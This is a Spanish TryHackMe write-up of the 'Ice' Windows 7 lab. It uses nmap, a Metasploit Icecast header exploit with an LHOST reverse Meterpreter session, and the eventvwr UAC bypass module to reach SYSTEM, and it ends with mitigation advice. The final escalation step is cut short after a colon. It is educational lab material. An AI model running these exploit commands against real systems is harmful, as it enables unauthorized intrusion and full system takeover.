---
layout: page
title: "Write-up: Ice"
platform: "TryHackMe"
difficulty: "Easy"
category: "Boot2Root"
---

**Write-up**: **Ice** - TryHackMe  
**Fecha**: 01/04/2026  
**Autor**: Adrian Sanchez Torrejon  
**Dificultad**: Fácil  
**IP de la Máquina**: 10.128.135.220

---

# 1. Resumen Ejecutivo

La máquina Ice es de dificultad fácil y cuenta con un sistema operativo Windows 7. El vector de entrada inicial se centró en la explotación de una vulnerabilidad en el servidor de streaming Icecast, que se encontraba corriendo en el puerto 8000. Tras obtener acceso como un usuario local con privilegios administrativos pero limitado por el Control de Cuentas de Usuario (UAC), se realizó un bypass de UAC para, posteriormente, elevar los privilegios de manera exitosa hasta el máximo nivel del sistema (SYSTEM).

- **Acceso a Usuario**: Conseguido
- **Acceso a Root(SYSTEM)**: Conseguido

# 2. Reconocimiento y Enumeración

## 2.1 Escaneo de Puertos (Nmap)

Se realiza un escaneo inicial para identificar los puertos abiertos y los servicios en ejecución.

```bash
nmap -sV -Pn --script vuln 10.128.135.220
```

**Resultados:**

![image.png](/assets/images/Ice/image.png)

# 3. Explotación (Acceso Inicial)

## 3.1 Identificación de la Vulnerabilidad

Procedemos a buscar exploits relacionados con el servicio Icecast dentro de Metasploit Framework.

![image.png](/assets/images/Ice/image%201.png)

Encontré un módulo excelente para la sobreescritura de encabezados (Header Overwrite): `exploit/windows/http/icecast_header`.

## 3.2 Ejecución y Shell

Seleccioné el módulo y procedí a configurar los parámetros necesarios.

```bash
msf > use exploit/windows/http/icecast_header
msf exploit(icecast_header) > set RHOSTS 10.128.135.220
msf exploit(icecast_header) > set LHOST 192.168.146.227
msf exploit(icecast_header) > run
```

![image.png](/assets/images/Ice/image%202.png)

El exploit se ejecutó de manera exitosa y obtuve una sesión de Meterpreter.

# 4. Escalada de Privilegios (System / Root)

## 4.1 Enumeración Interna

El usuario `Dark` pertenece al grupo de administradores, pero el Control de Cuentas de Usuario (UAC) se encuentra activo e impide ejecutar tareas con privilegios elevados de manera directa.

![image.png](/assets/images/Ice/image%203.png)

## 4.2 Explotación y Acceso SYSTEM

1. Para evadir esta restricción, busqué un módulo de bypass de UAC. Seleccioné el módulo basado en el visor de eventos (`eventvwr`): `exploit/windows/local/bypassuac_eventvwr`

![image.png](/assets/images/Ice/image%204.png)

1. Esto generó la **Sesión 3** exitosamente. Aunque seguíamos siendo el usuario `Dark`, ahora teníamos los permisos de administrador desbloqueados y privilegios avanzados como `SeDebugPrivilege` y `SeImpersonatePrivilege` en nuestro token.

![image.png](/assets/images/Ice/image%205.png)

Gracias a estos privilegios elevados, fue posible utilizar la herramienta automatizada de Metasploit para escalar al nivel de sistema:

# 5. Recomendaciones de Mitigación

Para remediar los fallos de seguridad encontrados en este entorno, se proponen las siguientes acciones correctivas:

1. **Actualización de Software de Terceros:** Actualizar de manera urgente el servidor Icecast a una versión donde la vulnerabilidad de desbordamiento en las cabeceras haya sido corregida.
2. **Principio de Menor Privilegio:** Asegurarse de que los servicios públicos (como Icecast) no se ejecuten bajo el contexto de una cuenta de usuario con capacidades administrativas, reduciendo drásticamente el impacto si el servicio es vulnerado.
3. **Robustecimiento de UAC:** Configurar las políticas de UAC en el sistema operativo Windows para que siempre soliciten credenciales en el escritorio seguro en lugar de permitir autoelevaciones directas a miembros del grupo de administradores.